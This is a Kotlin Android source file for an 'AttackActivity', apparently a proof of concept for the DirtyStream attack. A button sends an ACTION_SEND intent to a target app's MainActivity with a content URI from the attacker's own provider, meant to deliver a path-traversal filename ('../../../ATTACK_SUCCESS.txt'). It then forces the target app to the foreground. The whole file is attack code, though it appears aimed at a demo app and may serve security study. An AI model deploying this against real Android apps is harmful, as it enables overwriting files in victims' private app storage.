package com.example.dirtystream.attack

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.graphics.Color
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.ViewGroup
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast

class AttackActivity : Activity() {

    private val TAG = "AttackActivity"
    private lateinit var statusText: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Log.d(TAG, "🔥 AttackActivity starting...")

        try {
            // Create main container
            val mainLayout = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                setPadding(100, 100, 100, 100)
                setBackgroundColor(Color.parseColor("#ffebee"))  // Light red background
                layoutParams = ViewGroup.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.MATCH_PARENT
                )
            }

            // Add title
            val title = TextView(this).apply {
                text = "🔴 ATTACK APP"
                textSize = 24f
                setTextColor(Color.RED)
                setPadding(20, 20, 20, 40)
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                )
            }

            // Add attack button
            val attackButton = Button(this).apply {
                text = "🚀 Launch DirtyStream Attack"
                textSize = 18f
                setBackgroundColor(Color.RED)
                setTextColor(Color.WHITE)
                setPadding(40, 40, 40, 40)
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                ).apply {
                    topMargin = 20
                    bottomMargin = 20
                }

                setOnClickListener {
                    Log.d(TAG, "🔥 Attack button clicked!")
                    launchAttack()
                }
            }

            // Add status text
            statusText = TextView(this).apply {
                text = "Ready to launch attack..."
                textSize = 16f
                setTextColor(Color.BLUE)
                setPadding(20, 20, 20, 20)
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                )
            }

            // Add description
            val description = TextView(this).apply {
                text = "This will send a malicious file with path traversal to DirtyStream app"
                textSize = 14f
                setTextColor(Color.GRAY)
                setPadding(20, 20, 20, 20)
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                )
            }

            // Add all views to layout
            mainLayout.addView(title)
            mainLayout.addView(attackButton)
            mainLayout.addView(statusText)
            mainLayout.addView(description)

            setContentView(mainLayout)

            Log.d(TAG, "✅ AttackActivity UI created successfully")
            Log.d(TAG, "📱 Layout contains: ${mainLayout.childCount} views")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error creating UI", e)

            // Fallback: super simple button
            val fallbackButton = Button(this).apply {
                text = "ATTACK"
                textSize = 30f
                setOnClickListener { launchAttack() }
            }
            setContentView(fallbackButton)
        }
    }

    private fun launchAttack() {
        try {
            Log.d(TAG, "🚀 Launching DirtyStream attack...")

            val intent = Intent(Intent.ACTION_SEND).apply {
                type = "text/plain"

                val maliciousUri = Uri.parse("content://com.example.dirtystream.attack.provider/attack.txt")
                putExtra(Intent.EXTRA_STREAM, maliciousUri)

                component = ComponentName(
                    "com.example.dirtystream",
                    "com.example.dirtystream.MainActivity"
                )

                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }

            startActivity(intent)

            // Update UI to show success
            statusText.text = "✅ ATTACK SENT!\n📱 Opening DirtyStream app...\n🔍 Look for malicious filename:\n../../../ATTACK_SUCCESS.txt"
            statusText.setTextColor(Color.RED)

            // Force DirtyStream to foreground after 1 second
            Handler(Looper.getMainLooper()).postDelayed({
                val openIntent = Intent().apply {
                    component = ComponentName("com.example.dirtystream", "com.example.dirtystream.MainActivity")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                }
                startActivity(openIntent)
            }, 1000)

            Toast.makeText(this, "🚀 Attack launched! DirtyStream will open automatically!", Toast.LENGTH_LONG).show()
            Log.d(TAG, "✅ Attack intent sent successfully")

        } catch (e: Exception) {
            statusText.text = "❌ Attack failed: ${e.message}"
            statusText.setTextColor(Color.RED)
            Log.e(TAG, "❌ Error launching attack", e)
            Toast.makeText(this, "❌ Attack failed: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }
}